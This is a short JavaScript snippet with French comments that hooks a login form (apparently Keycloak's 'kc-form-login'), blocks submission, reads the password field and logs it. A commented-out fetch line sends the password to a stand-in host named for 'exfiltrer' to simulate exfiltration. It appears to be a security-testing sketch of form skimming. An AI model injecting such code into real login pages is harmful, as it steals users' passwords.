  document.getElementById('kc-form-login').addEventListener('submit', function(e) {
    // Empêcher la soumission pour tester
    e.preventDefault();
    // Récupérer la valeur du champ mot de passe
    var pwd = document.getElementById('password').value;
    // Envoyer la valeur à un serveur de test (par exemple, en la loggant dans la console)
    console.log("Mot de passe récupéré :", pwd);
    // Vous pouvez également utiliser fetch pour simuler une exfiltration
    // fetch('https://votre-serveur-de-test.com/exfiltrer?password=' + encodeURIComponent(pwd));
    // Pour laisser la soumission après vérification, vous pouvez réactiver la soumission avec : this.submit();
  });
